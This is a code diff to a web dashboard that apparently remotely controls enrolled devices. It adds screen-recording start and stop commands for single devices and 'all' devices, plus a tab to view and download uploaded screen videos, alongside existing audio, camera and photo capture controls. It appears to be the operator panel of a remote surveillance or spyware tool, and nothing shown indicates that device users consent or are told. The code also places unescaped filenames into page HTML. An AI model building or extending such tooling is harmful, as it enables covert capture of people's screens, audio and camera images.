@@ -149,6 +149,11 @@ body {
     background: linear-gradient(135deg, #2a1e1e 0%, #3d2d2d 100%);
 }
 
+.device-card.screen-recording {
+    border-color: #ffaa00;
+    background: linear-gradient(135deg, #2a2a1e 0%, #3d3d2d 100%);
+}
+
 .device-icon {
     font-size: 2rem;
     margin-bottom: 10px;
@@ -176,6 +181,11 @@ body {
 
 .status-dot.recording {
     background: #ff4444;
+    animation: pulse 1.5s infinite;
+}
+
+.status-dot.screen-recording {
+    background: #ffaa00;
     animation: pulse 1.5s infinite;
 }
 
@@ -280,6 +290,11 @@ body {
     color: white;
 }
 
+.btn-screen {
+    background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+    color: white;
+}
+
 /* Status Box */
 .status-box {
     background: rgba(0, 0, 0, 0.5);
@@ -350,6 +365,14 @@ body {
     height: 40px;
 }
 
+/* Video Player */
+.video-player {
+    width: 100%;
+    margin: 15px 0;
+    border-radius: 12px;
+    background: #000;
+}
+
 /* Photo Preview */
 .photo-preview {
     text-align: center;
@@ -418,7 +441,7 @@ body {
     background: #1a1a1a;
 }
 
-::-webkitwebkit-scrollbar-thumb {
+::-webkit-scrollbar-thumb {
     background: linear-gradient(45deg, #00ff88, #00ccff);
     border-radius: 4px;
 }
@@ -500,6 +523,9 @@ button:focus {
             <button class="tab-btn" onclick="openTab('photos')">
                 📸 Photos
             </button>
+            <button class="tab-btn" onclick="openTab('screenRecordings')">
+                📹 Screen Recordings
+            </button>
         </div>
 
         <!-- Devices Tab -->
@@ -536,6 +562,15 @@ button:focus {
                     </button>
                     <button class="btn btn-stop" onclick="sendDeviceCameraCommand('stop_camera')">
                         📵 Stop Camera
+                    </button>
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn btn-screen" onclick="sendDeviceCommand('start_screen_recording')">
+                        📱 Start Screen Recording
+                    </button>
+                    <button class="btn btn-stop" onclick="sendDeviceCommand('stop_screen_recording')">
+                        ⏹️ Stop Screen Recording
                     </button>
                 </div>
 
@@ -595,6 +630,15 @@ button:focus {
                     </button>
                 </div>
 
+                <div class="btn-group">
+                    <button class="btn btn-screen" onclick="sendCommand('start_screen_recording')">
+                        📱 Start Screen Recording All
+                    </button>
+                    <button class="btn btn-stop" onclick="sendCommand('stop_screen_recording')">
+                        ⏹️ Stop Screen Recording All
+                    </button>
+                </div>
+
                 <div class="status-box">
                     <h4>🌐 Global Status</h4>
                     <div id="globalStatus">Ready to send global commands...</div>
@@ -635,6 +679,25 @@ button:focus {
                         <div style="font-size: 3rem; margin-bottom: 20px;">📸</div>
                         <h3>No photos found</h3>
                         <p>Photos will appear here when devices capture and upload images</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen Recordings Tab -->
+        <div id="screenRecordings" class="tab-content">
+            <div class="control-panel">
+                <h3 style="color: #00ccff; margin-bottom: 20px;">📹 Screen Recordings</h3>
+                <button class="btn btn-refresh" onclick="refreshScreenRecordings()">
+                    🔄 Refresh Screen Recordings
+                </button>
+                <span id="screenRecordingsCount" style="margin-left: 15px; color: #00ff88;">0 recordings</span>
+                
+                <div class="files-grid" id="screenRecordingsList" style="margin-top: 20px;">
+                    <div style="text-align: center; color: #888; padding: 40px; width: 100%;">
+                        <div style="font-size: 3rem; margin-bottom: 20px;">📹</div>
+                        <h3>No screen recordings found</h3>
+                        <p>Screen recordings will appear here when devices upload video files</p>
                     </div>
                 </div>
             </div>
@@ -694,12 +757,20 @@ button:focus {
                 .then(data => {
                     if (data.status === 'success') {
                         const device = data.device;
-                        const status = device.recording ? '🔴 RECORDING' : '🟢 IDLE';
+                        let status = '';
+                        if (device.recording) {
+                            status = '🔴 RECORDING';
+                        } else if (device.screen_recording) {
+                            status = '🟡 SCREEN RECORDING';
+                        } else {
+                            status = '🟢 IDLE';
+                        }
                         document.getElementById('currentDeviceStatus').innerHTML = `
                             <strong>Status:</strong> ${status}<br>
                             <strong>Files:</strong> ${data.files_count} | 
                             <strong>Photos:</strong> ${data.photos_count} | 
-                            <strong>Audios:</strong> ${data.audios_count}
+                            <strong>Audios:</strong> ${data.audios_count} |
+                            <strong>Screen Recordings:</strong> ${data.screen_recordings_count}
                         `;
                     }
                 })
@@ -726,27 +797,31 @@ button:focus {
                         
                         for (let device_id in data.devices) {
                             const device = data.devices[device_id];
-                            const status = device.recording ? 'RECORDING' : 'IDLE';
-                            const statusClass = device.recording ? 'recording' : 'idle';
+                            let status = device.recording ? 'RECORDING' : (device.screen_recording ? 'SCREEN RECORDING' : 'IDLE');
+                            let statusClass = device.recording ? 'recording' : (device.screen_recording ? 'screen-recording' : 'idle');
+                            let statusIcon = device.recording ? '🔴' : (device.screen_recording ? '🟡' : '🟢');
                             const lastSeen = new Date(device.last_seen * 1000).toLocaleTimeString();
                             const deviceShortId = device_id.length > 20 ? device_id.substring(0, 20) + '...' : device_id;
                             
                             devicesHtml += `
                                 <div class="device-card ${statusClass}" onclick="showDeviceControl('${device_id}')">
                                     <div class="device-icon">
-                                        ${device.recording ? '🔴' : '🟢'}
+                                        ${statusIcon}
                                     </div>
                                     <div class="device-info">
                                         <h3>${deviceShortId}</h3>
                                         <div class="device-status">
-                                            <div class="status-dot ${device.recording ? 'recording' : ''}"></div>
+                                            <div class="status-dot ${statusClass}"></div>
                                             <span>${status}</span>
                                         </div>
                                         <div class="device-status">
                                             <span>Last Seen: ${lastSeen}</span>
                                         </div>
                                         <div class="device-status">
-                                            <span>Recording: ${device.recording ? 'Yes' : 'No'}</span>
+                                            <span>Audio Recording: ${device.recording ? 'Yes' : 'No'}</span>
+                                        </div>
+                                        <div class="device-status">
+                                            <span>Screen Recording: ${device.screen_recording ? 'Yes' : 'No'}</span>
                                         </div>
                                     </div>
                                 </div>`;
@@ -861,6 +936,29 @@ button:focus {
                                             <div><strong>Size:</strong> ${fileSizeKB} KB</div>
                                             <div><strong>Uploaded:</strong> ${uploadDate}</div>
                                         </div>
+                                        <div style="text-align: center; margin: 15px 0;">
+                                            <img src="${fileUrl}" alt="${file.filename}" style="max-width: 100%; border-radius: 10px; border: 2px solid #00ff88;">
+                                        </div>
+                                        <div class="file-actions">
+                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
+                                            <button class="btn btn-stop" onclick="deleteFile('${file.filename}')">🗑️ Delete</button>
+                                        </div>
+                                    </div>`;
+                            } else if (file.type === 'screen_recording') {
+                                filesHtml += `
+                                    <div class="file-card">
+                                        <div class="file-header">
+                                            <div class="file-type">📹</div>
+                                        </div>
+                                        <div class="file-info">
+                                            <div><strong>File:</strong> ${file.filename}</div>
+                                            <div><strong>Size:</strong> ${fileSizeKB} KB</div>
+                                            <div><strong>Uploaded:</strong> ${uploadDate}</div>
+                                        </div>
+                                        <video controls class="video-player">
+                                            <source src="${fileUrl}" type="video/mp4">
+                                            Your browser does not support the video tag.
+                                        </video>
                                         <div class="file-actions">
                                             <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
                                             <button class="btn btn-stop" onclick="deleteFile('${file.filename}')">🗑️ Delete</button>
@@ -952,7 +1050,7 @@ button:focus {
                 .then(response => response.json())
                 .then(data => {
                     let filesHtml = '';
-                    const audioFiles = data.files.filter(file => file.type !== 'photo');
+                    const audioFiles = data.files.filter(file => file.type === 'audio');
                     if (audioFiles.length > 0) {
                         document.getElementById('filesCount').textContent = audioFiles.length + ' files';
                         audioFiles.forEach(file => {
@@ -1035,6 +1133,51 @@ button:focus {
                 });
         }
 
+        function refreshScreenRecordings() {
+            fetch('/get_files')
+                .then(response => response.json())
+                .then(data => {
+                    let screenRecordingsHtml = '';
+                    const screenRecordingFiles = data.files.filter(file => file.type === 'screen_recording');
+                    if (screenRecordingFiles.length > 0) {
+                        document.getElementById('screenRecordingsCount').textContent = screenRecordingFiles.length + ' recordings';
+                        screenRecordingFiles.forEach(file => {
+                            const fileUrl = '/file/' + file.filename;
+                            const fileSizeKB = (file.size / 1024).toFixed(2);
+                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
+                            
+                            screenRecordingsHtml += `
+                                <div class="file-card">
+                                    <div class="file-header">
+                                        <div class="file-type">📹</div>
+                                    </div>
+                                    <div class="file-info">
+                                        <div><strong>File:</strong> ${file.filename}</div>
+                                        <div><strong>Device:</strong> ${file.device_id}</div>
+                                        <div><strong>Size:</strong> ${fileSizeKB} KB</div>
+                                        <div><strong>Uploaded:</strong> ${uploadDate}</div>
+                                    </div>
+                                    <video controls class="video-player">
+                                        <source src="${fileUrl}" type="video/mp4">
+                                        Your browser does not support the video tag.
+                                    </video>
+                                    <div class="file-actions">
+                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
+                                        <button class="btn btn-stop" onclick="deleteFile('${file.filename}')">🗑️ Delete</button>
+                                    </div>
+                                </div>`;
+                        });
+                    } else {
+                        screenRecordingsHtml = '<div style="text-align: center; color: #888; padding: 40px; width: 100%;"><div style="font-size: 3rem; margin-bottom: 20px;">📹</div><h3>No screen recordings found</h3><p>Screen recordings will appear here when devices upload video files</p></div>';
+                        document.getElementById('screenRecordingsCount').textContent = '0 recordings';
+                    }
+                    document.getElementById('screenRecordingsList').innerHTML = screenRecordingsHtml;
+                })
+                .catch(error => {
+                    document.getElementById('screenRecordingsList').innerHTML = '<div style="color: #ff4444; text-align: center;">Error loading screen recordings</div>';
+                });
+        }
+
         function downloadFile(filename) {
             window.open('/file/' + filename, '_blank');
         }
@@ -1056,6 +1199,7 @@ button:focus {
                         if (data.status === 'success') {
                             refreshPhotos();
                             refreshFiles();
+                            refreshScreenRecordings();
                             if (currentDeviceId) {
                                 refreshDeviceFiles();
                             }
@@ -1077,12 +1221,14 @@ button:focus {
         setInterval(refreshDevices, 3000);
         setInterval(refreshFiles, 5000);
         setInterval(refreshPhotos, 5000);
+        setInterval(refreshScreenRecordings, 5000);
         setInterval(updateTime, 1000);
         
         // Initial load
         refreshDevices();
         refreshFiles();
         refreshPhotos();
+        refreshScreenRecordings();
         updateTime();
     </script>
 </body>
